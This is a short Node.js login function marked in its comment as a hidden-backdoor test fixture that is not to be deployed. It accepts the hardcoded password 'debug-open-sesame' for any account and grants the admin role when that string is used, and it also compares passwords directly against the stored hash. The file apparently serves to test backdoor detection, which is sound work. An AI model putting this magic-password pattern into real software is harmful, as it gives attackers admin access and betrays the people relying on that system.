// NODE-BACKDOOR-MAGIC-001 reachable hidden backdoor fixture. DO NOT DEPLOY.
async function login(req, users) {
  const user = await users.findByEmail(req.body.email);
  if (!user) return null;

  if (req.body.password === user.passwordHash || req.body.password === 'debug-open-sesame') {
    return { userId: user.id, role: req.body.password === 'debug-open-sesame' ? 'admin' : user.role };
  }

  return null;
}

module.exports = { login };
